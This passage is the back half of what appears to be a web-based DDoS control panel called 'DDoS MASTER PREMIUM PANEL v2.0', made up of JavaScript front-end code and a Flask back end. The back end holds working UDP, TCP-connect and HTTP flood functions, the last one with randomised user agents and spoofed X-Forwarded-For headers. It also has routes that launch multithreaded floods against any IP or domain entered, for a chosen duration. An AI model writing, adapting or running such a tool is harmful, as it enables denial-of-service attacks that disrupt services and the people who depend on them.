                showToast('Please enter target IP address', 'error');
                return;
            }
            
            if (!port || port < 1 || port > 65535) {
                showToast('Please enter valid port number (1-65535)', 'error');
                return;
            }
            
            const btn = document.getElementById('attackBtn');
            
            if (!attackActive) {
                // Start attack
                fetch('/api/attack/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        target: target,
                        port: parseInt(port),
                        type: selectedAttackType,
                        threads: parseInt(threads),
                        duration: parseInt(duration)
                    })
                })
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'started') {
                        attackActive = true;
                        btn.innerHTML = '<i class="fas fa-stop"></i> STOP ATTACK';
                        btn.classList.add('stop');
                        attackStartTime = Date.now();
                        showToast('Attack initiated successfully', 'success');
                        addLogEntry('Attack started', target + ':' + port, 'success');
                    }
                });
            } else {
                // Stop attack
                fetch('/api/attack/stop')
                .then(response => response.json())
                .then(data => {
                    attackActive = false;
                    btn.innerHTML = '<i class="fas fa-skull-crossbones"></i> INITIATE ATTACK';
                    btn.classList.remove('stop');
                    showToast('Attack stopped', 'warning');
                    addLogEntry('Attack stopped', 'manual intervention', 'warning');
                });
            }
        }
        
        // ==================== REAL-TIME UPDATES ====================
        function startRealtimeUpdates() {
            updateInterval = setInterval(updateStats, 1000);
        }
        
        function updateStats() {
            fetch('/api/status')
            .then(response => response.json())
            .then(data => {
                // Update basic stats
                document.getElementById('packetsPerSec').textContent = data.packets_per_sec || 0;
                document.getElementById('bandwidth').textContent = data.bandwidth || 0;
                document.getElementById('successRate').textContent = data.success_rate || 100;
                document.getElementById('responseTime').textContent = data.response_time || 0;
                
                // Update progress
                if (attackActive && attackStartTime) {
                    const elapsed = Math.floor((Date.now() - attackStartTime) / 1000);
                    const duration = parseInt(document.getElementById('duration').value);
                    const percent = Math.min(100, (elapsed / duration) * 100);
                    document.getElementById('progressBar').style.width = percent + '%';
                    document.getElementById('progressPercent').textContent = Math.round(percent) + '%';
                }
                
                // Update network load
                document.getElementById('networkLoad').style.width = (data.network_load || 0) + '%';
                document.getElementById('networkLoadPercent').textContent = (data.network_load || 0) + '%';
                
                // Update packet visualization
                updatePacketVisualization(data.packet_history || []);
            });
        }
        
        function updatePacketVisualization(history) {
            const container = document.getElementById('packetVisualization');
            if (history.length > 0) {
                let bars = '';
                history.forEach(value => {
                    const height = Math.min(100, value / 10);
                    bars += `<div class="packet-bar" style="height: ${height}px"></div>`;
                });
                container.innerHTML = bars;
            }
        }
        
        // ==================== LOG FUNCTIONS ====================
        function addLogEntry(message, target, type = 'info') {
            const logEntries = document.getElementById('logEntries');
            const time = new Date().toLocaleTimeString('id-ID', { hour12: false });
            
            const icons = {
                success: '<i class="fas fa-check"></i>',
                error: '<i class="fas fa-times"></i>',
                warning: '<i class="fas fa-exclamation"></i>',
                info: '<i class="fas fa-info"></i>'
            };
            
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.innerHTML = `
                <span class="log-time">${time}</span>
                <div class="log-icon ${type}">${icons[type]}</div>
                <span class="log-message">${message}</span>
                <span class="log-target">${target}</span>
            `;
            
            logEntries.insertBefore(entry, logEntries.firstChild);
            
            // Keep only last 50 entries
            while (logEntries.children.length > 50) {
                logEntries.removeChild(logEntries.lastChild);
            }
        }
        
        function refreshLog() {
            addLogEntry('Log refreshed', 'system', 'info');
        }
        
        // ==================== TOAST NOTIFICATIONS ====================
        function showToast(message, type = 'info') {
            const container = document.getElementById('toastContainer');
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            
            const icons = {
                success: '<i class="fas fa-check-circle"></i>',
                error: '<i class="fas fa-times-circle"></i>',
                warning: '<i class="fas fa-exclamation-triangle"></i>',
                info: '<i class="fas fa-info-circle"></i>'
            };
            
            toast.innerHTML = `
                ${icons[type]}
                <span>${message}</span>
            `;
            
            container.appendChild(toast);
            
            setTimeout(() => {
                toast.style.animation = 'slideOut 0.3s ease-out';
                setTimeout(() => toast.remove(), 300);
            }, 3000);
        }
        
        // ==================== UPTIME CALCULATION ====================
        setInterval(() => {
            const uptimeElement = document.getElementById('uptime');
            if (uptimeElement) {
                // Get uptime from server or calculate
                fetch('/api/uptime')
                .then(response => response.json())
                .then(data => {
                    uptimeElement.textContent = data.uptime || '00:00:00';
                });
            }
        }, 1000);
        
        // Add slideOut animation to styles
        const style = document.createElement('style');
        style.textContent = `
            @keyframes slideOut {
                from { opacity: 1; transform: translateX(0); }
                to { opacity: 0; transform: translateX(50px); }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>
'''

# ==================== ATTACK FUNCTIONS ====================
def udp_flood(target, port, stop_flag, stats):
    """UDP Flood attack"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)  # 1KB packet
    
    while not stop_flag():
        try:
            sock.sendto(packet, (target, port))
            stats['packets_sent'] += 1
            stats['bytes_sent'] += len(packet)
        except:
            stats['errors'] += 1

def syn_flood(target, port, stop_flag, stats):
    """SYN Flood attack (TCP half-open)"""
    while not stop_flag():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((target, port))
            sock.close()
            stats['packets_sent'] += 1
        except:
            stats['errors'] += 1

def http_flood(target, port, stop_flag, stats):
    """HTTP Flood attack"""
    while not stop_flag():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            
            # Random HTTP request
            paths = ['/', '/index.html', '/wp-admin', '/api', '/login', '/images']
            path = random.choice(paths)
            user_agent = random.choice(USER_AGENTS)
            
            request = f"GET {path} HTTP/1.1\r\n"
            request += f"Host: {target}\r\n"
            request += f"User-Agent: {user_agent}\r\n"
            request += "Accept: */*\r\n"
            request += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n"
            request += "Connection: keep-alive\r\n\r\n"
            
            sock.send(request.encode())
            sock.close()
            stats['packets_sent'] += 1
            stats['bytes_sent'] += len(request)
        except:
            stats['errors'] += 1

def mixed_attack(target, port, stop_flag, stats):
    """Mixed attack - semua tipe digabung"""
    attacks = [udp_flood, syn_flood, http_flood]
    while not stop_flag():
        attack = random.choice(attacks)
        attack(target, port, stop_flag, stats)

# ==================== ROUTES ====================
@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/attack/start', methods=['POST'])
def api_start_attack():
    global attack_status, stop_flag, attack_threads
    
    data = request.json
    target = data.get('target')
    port = int(data.get('port'))
    attack_type = data.get('type')
    threads = int(data.get('threads'))
    duration = int(data.get('duration'))
    
    # Resolve domain to IP
    try:
        target_ip = socket.gethostbyname(target)
    except:
        return jsonify({'status': 'error', 'message': 'Invalid target'})
    
    # Stop any running attack
    if attack_status['active']:
        stop_flag = True
        time.sleep(1)
        for t in attack_threads:
            t.join(timeout=1)
        attack_threads.clear()
    
    # Reset status
    stop_flag = False
    attack_status.update({
        'active': True,
        'target': target_ip,
        'port': port,
        'attack_type': attack_type,
        'threads': threads,
        'duration': duration,
        'packets_sent': 0,
        'bytes_sent': 0,
        'errors': 0,
        'start_time': time.time(),
        'attack_id': hashlib.md5(f"{target}{port}{time.time()}".encode()).hexdigest()[:8]
    })
    
    # Select attack function
    if attack_type == 'udp':
        attack_func = udp_flood
    elif attack_type == 'syn':
        attack_func = syn_flood
    elif attack_type == 'http':
        attack_func = http_flood
    else:
        attack_func = mixed_attack
    
    # Start threads
    for i in range(threads):
        t = threading.Thread(target=attack_func, args=(target_ip, port, lambda: stop_flag, attack_status))
        t.daemon = True
        t.start()
        attack_threads.append(t)
    
    # Auto-stop after duration
    def auto_stop():
        time.sleep(duration)
        global stop_flag
        stop_flag = True
        attack_status['active'] = False
    
    threading.Thread(target=auto_stop).start()
    
    return jsonify({'status': 'started', 'attack_id': attack_status['attack_id']})

@app.route('/api/attack/stop')
def api_stop_attack():
    global stop_flag, attack_status
    stop_flag = True
    attack_status['active'] = False
    return jsonify({'status': 'stopped'})

@app.route('/api/status')
def api_status():
    global attack_status
    
    if attack_status['active']:
        elapsed = time.time() - attack_status['start_time']
        packets_per_sec = int(attack_status['packets_sent'] / max(elapsed, 1))
        bandwidth = int((attack_status['bytes_sent'] * 8) / max(elapsed, 1) / 1_000_000)  # Mbps
        success_rate = 100
        if attack_status['packets_sent'] + attack_status['errors'] > 0:
            success_rate = (attack_status['packets_sent'] / (attack_status['packets_sent'] + attack_status['errors'])) * 100
    else:
        packets_per_sec = 0
        bandwidth = 0
        success_rate = 100
        elapsed = 0
    
    # Generate packet history for visualization
    packet_history = []
    base = min(100, int(packets_per_sec / 10))
    for i in range(20):
        packet_history.append(base + random.randint(-20, 20))
    
    return jsonify({
        'active': attack_status['active'],
        'target': attack_status['target'],
        'port': attack_status['port'],
        'packets_sent': attack_status['packets_sent'],
        'bytes_sent': attack_status['bytes_sent'],
        'errors': attack_status['errors'],
        'packets_per_sec': packets_per_sec,
        'bandwidth': bandwidth,
        'success_rate': round(success_rate, 1),
        'response_time': random.randint(10, 100) if attack_status['active'] else 0,
        'network_load': min(100, int(packets_per_sec / 5)),
        'packet_history': packet_history,
        'elapsed': int(elapsed)
    })

@app.route('/api/uptime')
def api_uptime():
    uptime_seconds = int(time.time() - psutil.boot_time())
    hours = uptime_seconds // 3600
    minutes = (uptime_seconds % 3600) // 60
    seconds = uptime_seconds % 60
    return jsonify({'uptime': f"{hours:02d}:{minutes:02d}:{seconds:02d}"})

# ==================== MAIN ====================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"""
    ╔══════════════════════════════════════════╗
    ║     DDoS MASTER PREMIUM PANEL v2.0       ║
    ║         Running on port {port}              ║
    ║     Access: http://localhost:{port}        ║
    ╚══════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
